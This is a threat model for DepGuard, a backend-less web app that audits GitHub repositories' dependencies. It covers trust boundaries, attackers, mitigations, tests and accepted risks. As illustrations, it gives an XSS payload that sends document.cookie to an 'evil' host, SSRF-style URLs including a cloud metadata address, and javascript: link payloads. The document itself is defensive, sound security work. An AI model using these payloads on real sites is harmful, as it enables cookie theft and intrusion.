# Threat model

What DepGuard is worth attacking for, who would attack it, how, and what stops them.

This is a working document, not a formality. Every mitigation named here points at code or
a test, and every residual risk is one we decided to accept rather than one we did not
notice.

The headline conclusion is unusual and worth stating first: **DepGuard has no backend, no
database, no accounts and no credentials.** There is no server to compromise, no session
to steal and no stored data to exfiltrate. That removes most of what a web application is
normally attacked for, and it concentrates the entire realistic attack surface into one
place — the rendering and interpretation of third-party content that DepGuard did not
write and cannot vouch for.

---

## 1. Assets

In descending order of what we would actually mind losing.

| Asset                       | Why it matters                                                                                                                                                                    |
| --------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Correctness of a report** | The product's only reason to exist. A report that says "no vulnerabilities found" about a vulnerable repository causes real harm to whoever trusted it. This is asset number one. |
| **The visitor's browser**   | Script execution in the page's origin, or a crash or hang of the tab.                                                                                                             |
| **The visitor's privacy**   | Which repositories someone analysed. DepGuard stores none of this, so the asset is the absence of a record.                                                                       |
| **The published site**      | `dukeofwest.github.io/depguard/`. Whoever controls the bundle controls what every visitor executes.                                                                               |
| **The build pipeline**      | The path from source to published bundle. Compromising it is equivalent to compromising the site, and is harder to notice.                                                        |
| **The repository itself**   | Source, history and the project's reputation as something whose security claims can be trusted.                                                                                   |

Deliberately **not** assets, because they do not exist: user credentials, API tokens,
personal data, payment data, session state, server infrastructure.

---

## 2. Trust boundaries

```
┌─────────────────────────────────────────────────────────────────────────┐
│ THE VISITOR'S BROWSER                                                   │
│                                                                         │
│   ┌─────────────────────────────────────────────────────────────────┐   │
│   │ DepGuard origin (https://dukeofwest.github.io)                  │   │
│   │ Trusted: our own code, served over TLS, bounded by CSP          │   │
│   │                                                                 │   │
│   │  ╔═══════════════ BOUNDARY 1: user input ════════════════════╗  │   │
│   │  ║ The URL field. Untrusted text typed or pasted by anyone.   ║  │   │
│   │  ╚════════════════════════════════════════════════════════════╝  │   │
│   │                                                                 │   │
│   │  ╔═══════════════ BOUNDARY 2: engine purity ═════════════════╗  │   │
│   │  ║ src/app/engine/ performs no I/O and reads no clock.        ║  │   │
│   │  ║ Enforced by ESLint and by engine-purity.spec.ts.            ║  │   │
│   │  ╚════════════════════════════════════════════════════════════╝  │   │
│   └─────────────────────────────────────────────────────────────────┘   │
│                                   │                                     │
│      ╔════════════ BOUNDARY 3: the network ═══════════════════════╗     │
│      ║ CSP connect-src permits exactly three hosts. Nothing else   ║     │
│      ║ can be contacted, even by injected script.                  ║     │
│      ╚═════════════════════════════════════════════════════════════╝     │
└──────────────────────────────────┼──────────────────────────────────────┘
                                   │
         ┌─────────────────────────┼─────────────────────────┐
         ▼                         ▼                         ▼
  api.github.com      raw.githubusercontent.com        api.osv.dev
  ╔════════════════════════════════════════════════════════════════════╗
  ║ BOUNDARY 4: everything these return is untrusted input.             ║
  ║ The hosts are trusted to be who they say. Their *content* is not,   ║
  ║ because it is written by the owner of the repository being analysed ║
  ║ — who is precisely the party with a motive to influence the report. ║
  ╚════════════════════════════════════════════════════════════════════╝
```

Boundary 4 is the one that is easy to get wrong. `api.github.com` is a trustworthy
_host_; the `description` field it returns is a string an attacker wrote.

---

## 3. External data sources

Every byte that crosses boundary 4, and who controls it.

| Source                                | Controlled by             | Hostile content possible                                                                   |
| ------------------------------------- | ------------------------- | ------------------------------------------------------------------------------------------ |
| `GET /repos/{owner}/{repo}`           | the repository owner      | name, description, topics, licence name, `html_url`                                        |
| `GET .../git/trees/{ref}?recursive=1` | the repository owner      | every file path; the tree size; the `truncated` flag                                       |
| `GET .../actions/workflows`           | the repository owner      | workflow names and paths                                                                   |
| `GET .../releases/latest`             | the repository owner      | tag and release names                                                                      |
| `GET .../languages`                   | GitHub (derived)          | language names, byte counts                                                                |
| `GET .../stats/commit_activity`       | GitHub (derived)          | week totals; a `202` with no body                                                          |
| `GET .../contributors`                | GitHub                    | the `Link` header DepGuard parses with a regex                                             |
| `GET .../dependency-graph/sbom`       | the repository owner      | the whole SPDX document: package names, versions, purls, relationship graph, document size |
| `raw.githubusercontent.com/...`       | the repository owner      | file contents of allowlisted paths                                                         |
| `POST api.osv.dev/v1/querybatch`      | OSV, reflecting our query | advisory identifiers                                                                       |
| `GET api.osv.dev/v1/vulns/{id}`       | advisory publishers       | summary, details, severity, references, affected ranges                                    |

Two of these deserve emphasis. The **SBOM** is the largest and most structurally complex
document, and it is written by the repository owner — so size, depth, duplication and
string length are all attacker-chosen. **Advisory references** are URLs from a dozen
different publishers, rendered as links.

---

## 4. Entry points

1. **The repository URL field.** The only place a visitor supplies data.
2. **The initial page load.** The bundle, the CSP, and the integrity of GitHub Pages.
3. **Every HTTP response** listed in section 3.
4. **The JSON export.** Data leaving DepGuard into other tools.
5. **The build pipeline.** npm dependencies, GitHub Actions, the Pages deployment.
6. **A pull request.** Untrusted code proposed by a stranger, which CI then runs.

---

## 5. Potential attackers

| Attacker                     | Capability                                                    | Motive                                                                                                   |
| ---------------------------- | ------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------- |
| **Hostile repository owner** | Full control of their repository's metadata and SBOM          | Make DepGuard report their repository as healthy; or attack whoever analyses it. **The primary threat.** |
| **Malicious package author** | Controls a package name that appears in someone else's SBOM   | Reach the browsers of people auditing any repository that depends on them                                |
| **Advisory-feed poisoner**   | Can publish or influence an OSV record                        | Inject content, or a hostile reference link, into a report                                               |
| **Supply-chain attacker**    | Can compromise an npm package or a GitHub Action we depend on | Execute code in CI, or alter the published bundle. **The highest-impact threat.**                        |
| **Opportunistic scanner**    | Automated tooling against the public site                     | Finds misconfiguration; files reports                                                                    |
| **Someone sharing your IP**  | Can spend the 60-request anonymous budget                     | Denial of service against other users of that IP, intentional or not                                     |
| **Network attacker**         | On-path between visitor and GitHub Pages                      | Tamper with the bundle                                                                                   |

A notable absence: there is no privileged insider threat worth modelling, because there is
no privileged interface. Nobody, including the maintainer, can see what anyone analysed.

---

## 6. Attack scenarios and mitigations

Each scenario is a concrete thing an attacker would try, with the control that stops it
and where that control is tested.

### 6.1 Script injection through repository content

**Attack.** Name a repository, package, release or advisory
`<img src=x onerror=fetch('https://evil/'+document.cookie)>` and wait for someone to
analyse it.

**Mitigations.**

- All third-party text reaches the DOM through Angular interpolation, which escapes it.
  `innerHTML`, `outerHTML`, `document.write`, `eval` and dynamically generated templates
  appear nowhere in the source, and `bypassSecurityTrust*` is never called.
- Angular templates are compiled ahead of time, so data is never evaluated as a template.
- CSP `script-src 'self'` with no `'unsafe-inline'` and no `'unsafe-eval'`.
- `require-trusted-types-for 'script'` makes assignment of a plain string to a script sink
  throw. `angular#unsafe-bypass` is deliberately **not** in the `trusted-types` list, so a
  future call to `bypassSecurityTrustHtml` fails loudly rather than quietly reopening the
  hole.

**Tested by.** `features/dashboard/untrusted-content.spec.ts` pushes eight XSS payloads
through the real engine into the real components. `tools/csp-test.mjs` proves in Chrome
that an injected inline script does not execute and that `innerHTML` assignment throws.
`tools/release-review.cjs` fails the build if any dangerous sink or unsafe CSP keyword
appears in the shipped bundle.

**Residual risk.** A sanitiser bypass in Angular itself. Mitigated in depth: even with
script execution, `connect-src` permits only three hosts, so there is nowhere to send
anything, and there are no cookies or stored data to take.

### 6.2 Exfiltration after a successful injection

**Attack.** Having achieved script execution by any means, send data to an attacker's
server.

**Mitigation.** CSP `default-src 'none'` with `connect-src` limited to the three API
hosts. `img-src 'self' data:` closes the image-beacon route, and `form-action 'none'`
closes form submission.

**Tested by.** `tools/csp-test.mjs` attempts a real `fetch` to `example.com` and a real
form submission to `evil.example.com`, and asserts both are refused by the browser while
`api.github.com` remains reachable.

**Residual risk.** DNS prefetch and navigation-based exfiltration are not fully
closable by CSP. The impact is low because the page holds nothing secret: the most an
attacker could leak is which repository the visitor was looking at, which they would have
to already be able to run script to learn.

### 6.3 Making DepGuard contact an unintended host

**Attack.** Supply `https://github.com@evil.com/a/b`, `https://127.0.0.1/a/b`,
`https://169.254.169.254/a/b`, or a repository whose SBOM contains a URL DepGuard might
follow.

**Mitigations.**

- `parseRepositoryUrl` accepts only `github.com` and `www.github.com`, rejects reserved
  GitHub paths, rejects relative path segments before parsing (because `new URL()`
  normalises them away), and rejects embedded credentials and non-default ports.
- `isAllowedUrl` re-checks every request URL against the origin allowlist immediately
  before the request, so a bug elsewhere cannot produce a request to an arbitrary host.
- File paths fetched from `raw.githubusercontent.com` come from a fixed allowlist in
  `api.config.ts`. **No URL or path discovered inside repository content is ever
  fetched.**

**Tested by.** `core/utils/github-url.spec.ts` has 63 cases including loopback, private
ranges, cloud metadata, IPv6, decimal and hexadecimal IP encodings, credentials and
ports. `core/security.spec.ts` asserts every endpoint targets an approved origin and that
a traversal path cannot escape the repository.

**Redirects.** A browser follows redirects transparently, and `HttpClient` offers no
`redirect: 'manual'` equivalent, so DepGuard cannot inspect a redirect chain itself. The
control is the CSP: `connect-src` is enforced against **every** URL in a redirect chain,
not only the first, so a redirect from an allowlisted host to an attacker's server is
blocked by the browser. Phase 0 separately measured `redirected: false` on the SBOM
endpoint, so no redirect occurs in normal operation.

**Residual risk.** A redirect _within_ an allowlisted host is followed without
inspection. The impact is bounded by what those three hosts can return, and everything
they return is already treated as untrusted input.

### 6.4 Denial of service against the visitor's browser

**Attack.** Serve an SBOM that is enormous, nested 100,000 levels deep, contains one
entry repeated 20,000 times, or carries a 50 MB package name. Any of these can hang or
crash a tab without a single malicious script.

**Mitigations.**

| Vector                        | Control                                                                                                                      |
| ----------------------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| Oversized body                | 16 MB for the SBOM, 12 MB otherwise, checked against the response text **before** it is parsed                               |
| Excessive dependency count    | `maxPackages: 20000`                                                                                                         |
| Excessive JSON nesting        | `MAX_JSON_DEPTH = 32`, checked **iteratively** — a recursive checker would overflow on the input it exists to reject         |
| Oversized validation work     | `MAX_JSON_NODES`, bounding the validator itself                                                                              |
| Over-long strings             | `MAX_EXTERNAL_STRING_LENGTH = 4096`, truncating rather than discarding                                                       |
| Duplicate package entries     | Collapsed before querying OSV, so 20,000 repeats of one entry produce one query                                              |
| Malformed SPDX relationships  | The parser is total: any malformed input yields a result, never an exception                                                 |
| Catastrophic backtracking     | No pattern in the codebase contains a nested quantifier; header values are capped before matching                            |
| Excessive concurrent requests | OSV detail fetches bounded to 8 concurrent and 400 total; batches sent sequentially                                          |
| Unbounded retries             | At most 2, only for errors a retry can fix, with exponential backoff                                                         |
| Infinite polling              | There is none. The SBOM endpoint is synchronous; a `202` from the stats endpoint is reported as `Unknown` rather than polled |
| Stalled connection            | 30-second timeout on every request                                                                                           |

**Tested by.** `engine/validation/external-input.spec.ts` (boundary values and a 200,000-level
nesting bomb), `core/api/response-guard.spec.ts` (29 cases covering malformed, oversized
and nested bodies), `engine/performance.spec.ts`, `engine/parser-fuzz.spec.ts` (400 seeded
randomised documents per parser), and `core/security.spec.ts` (timeouts).

**Residual risk.** Accepted: a 16 MB SBOM on a low-memory device will be slow. The limit
is set from measurement — the largest real SBOM found was 1.1 MB, parsing in 2.8 ms — so
the headroom is generous, and refusing a legitimate large repository would be a worse
failure than being slow on a hostile one.

### 6.5 Making DepGuard report a false clean result

**The most damaging thing this product could do**, and therefore the scenario taken most
seriously. It is primarily a correctness concern, not a security one, but the motive is
adversarial: a repository owner wants a green badge.

**Attack.** Commit no lockfile so versions are ranges that cannot be matched; or make the
file tree so large that GitHub truncates it, so security files appear absent; or supply
versions OSV will silently mismatch.

**Mitigations.**

- A category with coverage below 0.5 reports **insufficient data** and has no `score`
  field at all — the type makes a dishonest state unrepresentable.
- Dependency Security additionally requires at least 50% of dependencies to be checkable.
- `truncated: true` on the file tree degrades checks to `Unknown`, never to `Not detected`.
- Only exact versions are sent to OSV (ADR-0002), because OSV does not reject a range
  supplied where a version belongs — it silently returns a different answer.
- A clean result is capped by the proportion of dependencies actually examined.
- A partial OSV result is reported as partial rather than as clean.

**Tested by.** `engine/scoring/scoring.spec.ts`, `engine/report/report-builder.spec.ts`,
and the four real captured SBOMs in `engine/__fixtures__/` including `request/request`, for
which 0 of 41 packages are checkable. The fuzz suite asserts across 400 randomised
documents that nothing lacking an exact version is ever queryable.

**Residual risk.** Documented and open: a repository whose dependencies cannot be checked
at all can still score highly on documentation, licensing and activity — `psf/requests`
scores 92 with Dependency Security unassessable. The report says so in three places, but
the headline number alone does not convey it. Recorded in [ROADMAP.md](ROADMAP.md) as a
product decision rather than a defect.

### 6.6 A hostile link in a report

**Attack.** Publish an advisory whose `references[].url` is
`javascript:alert(1)`, `data:text/html;...`, or a phishing page.

**Mitigations.** References are accepted only if `new URL(value).protocol === 'https:'` —
parsed the same way the browser will parse the `href`, so there is no gap between what is
validated and what would be navigated to. All external links carry
`rel="noopener noreferrer"`, and `<meta name="referrer" content="no-referrer">` prevents
leaking the analysed repository to the link target.

**Accepted design decision.** The reference _host_ is deliberately not allowlisted.
Advisory references legitimately point to dozens of hosts — `nvd.nist.gov`,
`lists.debian.org`, a project's own tracker — and an allowlist would silently drop the
evidence a reader needs to verify a finding. Scheme restriction plus `noopener noreferrer`
is the proportionate control.

**Residual risk.** A reader can be sent to a phishing page by a poisoned advisory feed.
This is inherent to displaying advisory references at all, and the alternative — not
showing them — would make findings unverifiable.

### 6.7 Supply-chain compromise of the build

**The highest-impact scenario in this document.** Whoever controls the bundle controls
what every visitor executes, and the compromise would be invisible to users.

**Mitigations.**

- `package-lock.json` is committed; CI uses `npm ci`, never `npm install`.
- Six runtime dependencies in total: `@angular/common`, `@angular/compiler`,
  `@angular/core`, `@angular/platform-browser`, `rxjs`, `tslib`. No semver library, no
  YAML parser, no UI framework. Every dependency not taken is an attack path not taken.
- `npm audit --omit=dev --audit-level=low` gates what ships; a single advisory of any
  severity in a runtime dependency fails the build.
- Every GitHub Action is pinned to a **full commit SHA**, not a tag. A tag is mutable by
  whoever owns the action.
- `persist-credentials: false` on every checkout, so no token is left in `.git/config`
  for a later step — or a dependency's install script — to read.
- `permissions: {}` at the top of the deploy workflow; only the deploy job may write, and
  it runs no repository code.
- No `pull_request_target` trigger anywhere, which is the most exploited Actions
  misconfiguration.
- Zizmor runs in CI over all workflows at `--persona=auditor --min-severity=low`.
- Dependabot covers both npm and `github-actions`, and understands a SHA pin with a
  version comment — so pinning does not mean going stale.

**Cache and artifact poisoning.** Considered specifically, because both are routes that
bypass the dependency controls above. The npm cache is keyed on `package-lock.json`,
GitHub scopes a pull-request cache so it cannot be written into the base branch's scope,
and `npm ci` verifies integrity hashes after restoring — so a poisoned entry fails the
install rather than being installed. The Pages artifact is produced by the build job and
consumed by the deploy job in the same workflow run; the deploy job checks out no code and
runs nothing from the repository, so there is no step between production and publication
for an attacker to influence. `npm audit signatures` additionally verifies that every
installed package carries the registry signature it should, with provenance attestations on
a substantial share of them. CI asserts that the check passes rather than a fixed count,
since the counts move with every dependency change.

**Residual risk.** Accepted and significant: a compromise of Angular, rxjs or tslib
upstream would reach the bundle, and `npm ci` verifies integrity hashes against the
lockfile rather than provenance. Narrowing this further would require reproducible builds
and signature verification, which npm does not yet make practical for an application of
this size. Four packages run install scripts at build time (`esbuild`,
`@parcel/watcher`, `lmdb`, `msgpackr-extract`); all are standard native-binary
installers, reviewed and recorded in [SECURITY.md](SECURITY.md).

### 6.8 Tampering in transit, or loss of the published site

**Mitigations.** Measured against the live site rather than assumed:
`http://dukeofwest.github.io/depguard/` returns `301` to the `https://` address, and the
Pages API reports `https_enforced: true`. There is, however, **no
`Strict-Transport-Security` response header** — see §7. Deployment runs
only from `main`, only after lint, typecheck, tests, a runtime audit, the CSP proof and
the artifact review all pass.

**Residual risk.** Accepted: GitHub controls the hosting, the TLS certificate and the
DNS. A compromise of the GitHub account would allow replacing the site; the account
protections in [SECURITY.md](SECURITY.md) §Repository hardening are the control, and they
are the maintainer's responsibility rather than something the code can enforce.

### 6.9 Denial of service by exhausting the rate limit

**Attack.** Spend the 60 anonymous requests available to an IP address, so others sharing
it cannot scan.

**Mitigation.** Not preventable without a backend, and deliberately not attempted. The
remaining budget is displayed at all times, a scan refuses to start below
`minimumRemainingToStart: 10` rather than failing halfway, and responses are cached per
session so repeating an analysis costs nothing.

**Residual risk.** Accepted and documented. It is GitHub's limit, applied per IP, and a
shared office or campus address shares the budget.

### 6.10 Hostile pull request

**Attack.** Open a PR whose code exfiltrates a secret or alters the published bundle when
CI runs it.

**Mitigations.** `permissions: contents: read` on CI, `persist-credentials: false`, no
`pull_request_target`, and no deployment secret available to any CI job. Deployment is a
separate workflow that triggers only on a push to `main`. Branch protection and required
checks are listed in [SECURITY.md](SECURITY.md) as maintainer actions.

**Residual risk.** A PR can still run arbitrary code in CI with read-only access to a
public repository — which is the normal trade-off of accepting contributions. There is
nothing confidential for it to read.

---

## 7. Content Security Policy: what we can and cannot deliver

GitHub Pages serves a fixed set of response headers and offers no mechanism to add one.
The policy is therefore delivered as a `<meta http-equiv>` tag, which browsers enforce
identically to a header **with two specification-level exceptions**:

| Directive                   | Status on GitHub Pages                    | Consequence                                                                                                                                                                                                                                                                                             |
| --------------------------- | ----------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `frame-ancestors`           | **Cannot be set in a meta tag at all**    | DepGuard can be framed by any site. Impact is low: there is no authenticated action, no form and no state to clickjack. A framed copy can only mislead about what it is.                                                                                                                                |
| `Strict-Transport-Security` | Header only; **not sent** by GitHub Pages | Verified absent on the live site. HTTP is answered with a `301` to HTTPS, so the exposure is the narrow first-visit window before that redirect, on a page that carries no credential or cookie. It cannot be closed from here: a static host that sends no custom headers cannot send this one either. |
| `X-Content-Type-Options`    | Header only; not settable                 | Low impact; all assets are served with correct types by Pages.                                                                                                                                                                                                                                          |
| Report collection           | Needs an endpoint                         | No violation reporting in production. Compensated by `tools/csp-test.mjs` in CI, which proves enforcement before release.                                                                                                                                                                               |

**Recommended alternative, if header control becomes necessary.** Cloudflare Pages or
Netlify, both of which support a `_headers` file and would allow `frame-ancestors 'none'`,
`X-Content-Type-Options: nosniff` and a CSP report endpoint. This is **not** recommended
today: the gap is one directive whose impact on a stateless, credential-free page is
negligible, and moving hosting would add a third party to the trust model to close it. The
trade would not be worth it.

### Trusted Types

Enforced in production via `require-trusted-types-for 'script'`, with the policy list
`angular angular#bundler`. This was evaluated by running the real application in headless
Chrome rather than from documentation: the policy was initially written with
`base-uri 'none'` and `style-src-attr 'unsafe-inline'`, and the browser rejected both —
the first blocks the `<base href="/depguard/">` a project page requires, the second does
not cover Angular's runtime-injected component styles. Both were corrected and re-verified.
See `tools/csp-test.mjs`.

`style-src` carries `'unsafe-inline'`, which is required: Angular injects each component's
styles as a `<style>` element at runtime. The justification, and why it does not weaken
the policy meaningfully, is recorded in full in the comment above the policy in
`src/index.html` — in short, it applies to CSS only, `script-src` grants no unsafe
keyword, and CSS has no exfiltration route because `img-src` is `'self' data:` and
`default-src` is `'none'`. A nonce would be stricter but requires a per-response value,
which a static host cannot provide.

---

## 8. Summary of residual risks

Accepted, in rough order of significance. None is a critical or high-severity application
security issue; each is either inherent to the architecture or a deliberate trade.

1. **Upstream compromise of a runtime dependency** would reach the bundle. Mitigated by
   keeping the runtime dependency count at six, gating runtime advisories at `low`, and
   pinning all CI actions by SHA.
2. **GitHub controls hosting, TLS and DNS.** Unavoidable for a free static site.
3. **`frame-ancestors` cannot be set**, so the page can be framed. Low impact on a
   stateless page.
4. **No `Strict-Transport-Security` header.** Verified absent on the live site. A visitor
   typing `http://` is redirected with a `301`, but that first request leaves the browser
   unencrypted. Not closable on GitHub Pages, and the page carries nothing secret.
5. **`style-src 'unsafe-inline'`** is required by Angular's runtime style injection.
6. **Rate-limit exhaustion by IP neighbours** cannot be prevented without a backend.
7. **A high score alongside an unassessable security category** can mislead a reader who
   looks only at the headline number. Open question in [ROADMAP.md](ROADMAP.md).
8. **Advisory reference hosts are not allowlisted**, so a poisoned feed could link to a
   phishing page.
9. **One moderate build-time advisory** (`minimatch`) has no fix that does not require a
   linter downgrade. The `glob` advisory that sat beside it was cleared by the Angular 22
   upgrade. `minimatch` appears nowhere in the shipped bundle — verified, not assumed.
   Triage in [SECURITY.md](SECURITY.md).
10. **Six unverified OSV ecosystems** are queried with a disclosure in the report, mapped
    from documentation rather than demonstrated against live data.

## 9. What this assessment is not

This is a threat model written by the people who wrote the code. It has not been
independently audited, and there has been no external penetration test. The testing
described here is thorough in the areas it covers and silent about unknown unknowns.

DepGuard is **not** claimed to be secure or immune to attack. What is claimed is narrower
and checkable: the controls described above exist, they are tested, and the tests run in
CI on every change.

See [SECURITY-TESTING.md](SECURITY-TESTING.md) for how to run and extend that testing, and
[INCIDENT-RESPONSE.md](INCIDENT-RESPONSE.md) for what happens when something gets through.
